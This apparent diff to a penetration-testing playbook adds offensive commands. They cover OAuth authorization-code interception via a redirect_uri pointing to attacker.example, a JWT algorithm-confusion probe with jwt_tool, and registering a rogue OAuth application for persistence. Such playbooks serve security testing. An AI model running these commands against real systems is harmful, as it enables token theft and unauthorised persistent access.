@@ -100,15 +100,19 @@ whatweb target.com
 ### Exploitation
 
 ```bash
-# Various exploitation payloads
-# (See kali-claw for full library)
+# OAuth authorization-code interception via redirect_uri weakness
+curl -s "https://idp.target.example/authorize?response_type=code&client_id=APP&redirect_uri=https://attacker.example/cb&state=x"
+
+# JWT alg confusion probe (RS256 token replayed as HS256 with public key as secret)
+python3 jwt_tool.py tokens.jwt -X k -pk public.pem
 ```
 
 ### Persistence
 
 ```bash
-# Persistence techniques
-# (Depends on specific target)
+# Rogue OAuth app registration persistence (requires admin consent in lab)
+curl -s -X POST "https://graph.target.example/v1.0/applications" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" -d @rogue-app-manifest.json
 ```
 
 ---
